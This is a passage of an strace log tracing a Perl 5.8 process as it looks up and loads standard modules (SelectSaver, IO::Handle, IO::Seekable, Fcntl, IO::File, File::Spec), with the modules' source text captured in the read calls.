 return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
11347 07:37:14.578929 read(8, "", 4096) = 0
11347 07:37:14.578946 close(8)          = 0
11347 07:37:14.579011 stat64("/etc/perl/SelectSaver.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579027 stat64("/etc/perl/SelectSaver.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579042 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579055 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579069 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579082 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579096 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579109 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11345 07:37:14.579128 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
11347 07:37:14.579143 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579156 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579169 stat64("/usr/lib/perl/5.8/SelectSaver.pmc",  <unfinished ...>
11345 07:37:14.579177 <... rt_sigprocmask resumed> NULL, 8) = 0
11345 07:37:14.579193 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
11347 07:37:14.579202 <... stat64 resumed> 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579209 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579223 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.579236 stat64("/usr/share/perl/5.8/SelectSaver.pm",  <unfinished ...>
11345 07:37:14.579244 <... rt_sigprocmask resumed> [], 8) = 0
11347 07:37:14.579252 <... stat64 resumed> {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
11345 07:37:14.579267 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
11347 07:37:14.579277 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE <unfinished ...>
11345 07:37:14.579285 <... rt_sigprocmask resumed> NULL, 8) = 0
11345 07:37:14.579292 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
11347 07:37:14.579300 <... open resumed> ) = 8
11345 07:37:14.579334 <... rt_sigprocmask resumed> [], 8) = 0
11345 07:37:14.579358 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
11347 07:37:14.579368 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
11345 07:37:14.579375 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
11345 07:37:14.579383 waitpid(-1,  <unfinished ...>
11347 07:37:14.579393 <... ioctl resumed> , 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.579401 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.579421 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
11347 07:37:14.579549 brk(0x81d6000)    = 0x81d6000
11347 07:37:14.579580 read(8, "", 4096) = 0
11347 07:37:14.579592 close(8)          = 0
11347 07:37:14.580604 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
11347 07:37:14.581203 read(6, "", 4096) = 0
11347 07:37:14.581219 close(6)          = 0
11347 07:37:14.581260 stat64("/etc/perl/IO/Seekable.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581323 stat64("/etc/perl/IO/Seekable.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581337 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581350 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581365 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581378 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581392 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581404 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581417 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581429 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581442 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.581456 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
11347 07:37:14.581478 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.581493 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.581505 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.581524 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
11347 07:37:14.581658 stat64("/etc/perl/Fcntl.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581674 stat64("/etc/perl/Fcntl.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581688 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581700 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581714 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581726 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581740 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581752 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581809 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581823 stat64("/usr/share/perl5/Fcntl.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581836 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.581848 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
11347 07:37:14.581869 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.581884 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.581895 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.581914 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
11347 07:37:14.582294 brk(0x81f7000)    = 0x81f7000
11347 07:37:14.582522 read(8, "", 4096) = 0
11347 07:37:14.582538 close(8)          = 0
11347 07:37:14.582609 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
11347 07:37:14.582634 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11347 07:37:14.582661 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
11347 07:37:14.582676 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
11347 07:37:14.582778 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
11347 07:37:14.582797 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7ddb000
11347 07:37:14.582811 mmap2(0xb7dde000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7dde000
11347 07:37:14.582826 close(8)          = 0
11347 07:37:14.583033 read(6, "", 4096) = 0
11347 07:37:14.583048 close(6)          = 0
11347 07:37:14.583080 stat64("/etc/perl/IO/File.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583095 stat64("/etc/perl/IO/File.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583113 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583126 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583141 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583154 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583167 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583179 stat64("/usr/lib/perl5/IO/File.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583192 stat64("/usr/share/perl5/IO/File.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583205 stat64("/usr/share/perl5/IO/File.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583218 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.583230 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
11347 07:37:14.583252 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.583353 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.583366 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.583384 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
11347 07:37:14.583626 stat64("/etc/perl/File/Spec.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589804 stat64("/etc/perl/File/Spec.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589804 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589804 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589804 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589805 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589805 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589805 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589805 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589805 stat64("/usr/share/perl5/File/Spec.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589806 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589809 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589824 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.589837 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
11347 07:37:14.589858 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.589873 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.589886 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.589905 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
11347 07:37:14.589984 stat64("/etc/perl/vars.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
